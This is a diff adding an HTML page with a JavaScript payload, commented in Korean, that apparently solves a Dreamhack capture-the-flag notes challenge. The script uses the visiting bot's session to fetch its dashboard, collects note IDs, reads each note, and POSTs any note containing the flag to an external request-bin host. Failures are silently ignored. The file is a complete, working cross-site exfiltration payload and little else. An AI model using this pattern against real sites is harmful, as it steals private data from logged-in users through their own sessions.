@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+(async () => {
+  try {
+    // 1. 봇의 /dashboard 요청
+    const dash = await fetch("/dashboard").then(r => r.text());
+
+    // 2. 노트 ID 추출 (UUID 형태)
+    const regex = /\/note\/([0-9a-f\-]{36})/g;
+    const ids = [...dash.matchAll(regex)].map(m => m[1]);
+
+    // 3. 각 노트 내용을 확인해 플래그 포함 여부 확인
+    for (const id of ids) {
+      const res = await fetch("/note/" + id);
+      const text = await res.text();
+
+      // 플래그가 들어 있는 노트를 찾으면 exfiltrate
+      if (text.includes("juicy flag")) {
+        await fetch("https://kwyseea.request.dreamhack.games", {
+          method: "POST",
+          mode: "no-cors",
+          body: text
+        });
+        break; // 한 번 보내고 끝내기
+      }
+    }
+  } catch (e) {
+    // 실패해도 아무것도 하지 않음
+  }
+})();
+</script>
+</body>
+</html>
